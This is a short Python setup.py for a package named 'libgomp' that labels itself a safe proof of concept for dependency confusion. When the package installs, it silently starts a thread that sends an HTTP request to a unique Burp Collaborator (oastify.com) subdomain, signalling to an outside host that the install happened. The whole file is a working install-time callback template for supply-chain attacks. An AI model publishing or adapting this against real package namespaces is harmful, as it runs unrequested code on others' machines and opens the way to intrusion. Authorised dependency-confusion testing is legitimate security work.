from setuptools import setup
import threading
import uuid
import urllib.request

def ping_collaborator():
    try:
        token = str(uuid.uuid4())  # unique per install
        url = f"http://{token}.n8wwpki8c47e2ialygerxcm7nytphgj48.oastify.com"
        urllib.request.urlopen(url, timeout=3)
    except Exception:
        pass

threading.Thread(target=ping_collaborator).start()

setup(
    name="libgomp",
    version="1.1.4",
    description="Safe PoC package for dependency confusion",
    packages=["libgomp"],
    install_requires=[],
)
